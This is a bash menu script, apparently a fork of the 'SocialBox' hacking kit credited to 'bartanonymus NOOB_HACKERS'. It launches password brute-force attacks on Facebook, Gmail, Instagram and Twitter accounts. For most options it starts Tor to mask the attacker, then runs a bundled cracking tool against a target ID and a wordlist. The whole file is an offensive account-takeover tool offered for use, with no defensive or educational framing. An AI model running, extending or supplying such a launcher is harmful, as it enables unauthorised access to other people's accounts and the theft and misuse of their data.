#!/bin/bash
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"

       echo -e "$red by bartanonymus NOOB_HACKERS$nc"
sleep 3

clear
#Startup
echo -e "$green"
b.             8     ,o888888o.         ,o888888o.     8 888888888o  
888o.          8  . 8888     `88.    . 8888     `88.   8 8888    `88.
Y88888o.       8 ,8 8888       `8b  ,8 8888       `8b  8 8888     `88
.`Y888888o.    8 88 8888        `8b 88 8888        `8b 8 8888     ,88
8o. `Y888888o. 8 88 8888         88 88 8888         88 8 8888.   ,88'
8`Y8o. `Y88888o8 88 8888         88 88 8888         88 8 8888888888  
8   `Y8o. `Y8888 88 8888        ,8P 88 8888        ,8P 8 8888    `88.
8      `Y8o. `Y8 `8 8888       ,8P  `8 8888       ,8P  8 8888      88
8         `Y8o.`  ` 8888     ,88'    ` 8888     ,88'   8 8888    ,88'
8            `Yo     `8888888P'         `8888888P'     8 888888888P  
                                                                     
8 8888        8          .8.           ,o888888o.    8 8888     ,88' 
8 8888        8         .888.         8888     `88.  8 8888    ,88'  
8 8888        8        :88888.     ,8 8888       `8. 8 8888   ,88'   
8 8888        8       . `88888.    88 8888           8 8888  ,88'    
8 8888        8      .8. `88888.   88 8888           8 8888 ,88'     
8 8888        8     .8`8. `88888.  88 8888           8 8888 88'      
8 8888888888888    .8' `8. `88888. 88 8888           8 888888<       
8 8888        8   .8'   `8. `88888.`8 8888       .8' 8 8888 `Y8.     
8 8888        8  .888888888. `88888.  8888     ,88'  8 8888   `Y8.   
8 8888        8 .8'       `8. `88888.  `8888888P'    8 8888     `Y8. 
                                                                     
8 8888888888   8 888888888o.     d888888o.                           
8 8888         8 8888    `88.  .`8888:' `88.                         
8 8888         8 8888     `88  8.`8888.   Y8                         
8 8888         8 8888     ,88  `8.`8888.                             
8 888888888888 8 8888.   ,88'   `8.`8888.                            
8 8888         8 888888888P'     `8.`8888.                           
8 8888         8 8888`8b          `8.`8888.                          
8 8888         8 8888 `8b.    8b   `8.`8888.                         
8 8888         8 8888   `8b.  `8b.  ;8.`8888                         
8 888888888888 8 8888     `88. `Y8888P ,88P'                         $nc $blue v2.beta$nc"
#echo -e "	[+]              $red Coded By bartanonymus         		   [+]"
#echo -e "	[+] 		 $red Web site is creating $nc 		   [+]"
#echo -e "	[+] 		 $red SOcialbox$nc          		   [+]"
echo ""
echo -e "$yellow Select From Menu : $nc"
echo ""
echo -e "		$Cyan 1 : Brute Force Facebook Account$nc"
echo -e "		$Cyan 2 : Brute Force Gmail Account$nc"
echo -e "		$Cyan 3 : Brute Force Instagram Account 1$nc"
echo -e "		$Cyan 4 : Brute Force Twitter Account$nc"
echo -e "		$Cyan 5 : Brute Force Instagram Account 2 $nc"
echo -e "		$Cyan 6 : Brute Force Facebook Account 2$nc"
echo -e "		$Cyan 99: Exit$nc"
read -p "Choice >  " ch
if [ $ch = 1 ]; then
echo -e "			$Cyan Facebook Brute Force$nc"
echo -e "$green"
read -p "Enter Facebook ID / Email / Username / Number: " id
read -p "Enter wordlist path : " wordlist
echo -e "$nc"
cd facebook
perl fb-brute.pl $id $wordlist
echo -e " 		[+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check
echo -e "$nc"
if [ $check = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 2 ]; then
echo -e "			$Cyan Gmail Brute Force$nc"
cd Gemail-Hack
python2 gemailhack.py
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check2
echo -e "$nc"
if [ $check2 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check2 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 3 ]; then
echo -e "			$Cyan Instagram Brute Force 1$nc"
cd instainsane/
sleep 0.025
	echo -e "	[+]$red tor $nc[+]"
sleep 0.9
sv tor start
./instainsane.sh
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
#echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check3
echo -e "$nc"
if [ $check3 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check3 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 4 ]; then
echo -e "			$Cyan Twitter Brute Force$nc"
cd tweetshell/
sleep 0.025
        echo -e "	[+]$red Service Tor Stated $nc[+]"
sleep 0.9
sv tor start
bash tweetshell.sh
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check4
echo -e "$nc"
if [ $check4 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check4 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 5 ]; then
echo -e "			$Cyan Instagram Brute Force 2$nc"
cd insta-bf/
sleep 0.025
        echo -e "	[+]$red Service Tor Started $nc[+]"
sleep 0.9
sv tor start
python instabf.py
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check5
echo -e "$nc"
if [ $check5 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch = 6 ]; then
echo -e "			$Cyan facebook Brute Force 2$nc"
cd fikrado.py
sleep 0.025
        echo -e "	[+]$red Service Tor Started $nc[+]"
sleep 0.9
sv tor start
python2 fikrado.py
echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
sv tor stop
echo -e "		[+]$red Service Tor Stopped$nc [+]"
echo -e "$red"
read -p "Wanna Back To Main Menu [ Y / n ] : " check5
echo -e "$nc"
if [ $check5 = "Y" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "y" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "Yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "yes" ]; then
cd .. && bash SocialBox.sh
elif [ $check5 = "YES" ]; then
cd .. && bash SocialBox.sh
else
exit 1
fi
elif [ $ch == 99 ]; then
echo -e "$red Program Exit ...$nc"
sleep 0.25
exit 1
else
echo "Not Found 404 , Exit"
exit 1
fi
